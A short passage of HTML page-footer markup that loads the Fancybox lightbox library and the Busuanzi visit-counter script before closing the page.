src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
